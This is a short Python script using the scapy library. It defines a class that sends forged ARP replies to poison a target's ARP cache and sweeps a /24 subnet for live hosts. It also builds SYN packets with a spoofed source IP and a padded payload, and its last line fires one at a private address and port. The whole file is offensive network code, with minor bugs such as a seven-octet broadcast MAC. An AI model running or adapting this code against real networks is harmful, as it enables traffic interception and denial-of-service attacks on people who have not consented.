import scapy.all as scapy

class arpSpoof:
    #TODO: the arp spoof packet

    def getMAC(self, iphackerIp):
        arp_req_frame = scapy.ARP(pdst = iphackerIp)
        broadcast_ether_frame = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
        broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame
        answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout = 1, verbose = False)[0]
        return answered_list[0][1].hwsrc
    def spoof(self,hackerIp, targetip):
        macAddr = self.getMAC(targetip)
        arpPacket = scapy.ARP(pdst=targetip, psrc=hackerIp, hwdst = macAddr, op = 2)
        scapy.send(arpPacket, verbose= False)


    def getIps(self, hackerip):
        ips = []
        arpRequest = scapy.ARP(pdst=f'{hackerip}/24')
        brodcustEther = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff:ff")
        packet = brodcustEther / arpRequest

        result = scapy.srp(packet, timeout = 3)[0]
        for sent, received  in result:
            ips.append(received.psrc)
        return ips


    def synPacket(self, tragetIp, tragetPort):
        ip = scapy.IP(dst=tragetIp, src = '10.100.102.48')

        tcp = scapy.TCP(sport=scapy.RandShort(), dport= tragetPort, flags='S')


        raw = scapy.Raw(b"x"*1024)
        packet = ip / tcp / raw

        scapy.send(packet, loop=0, verbose =0)


arp = arpSpoof()
arp.synPacket('10.100.102.13',8080)
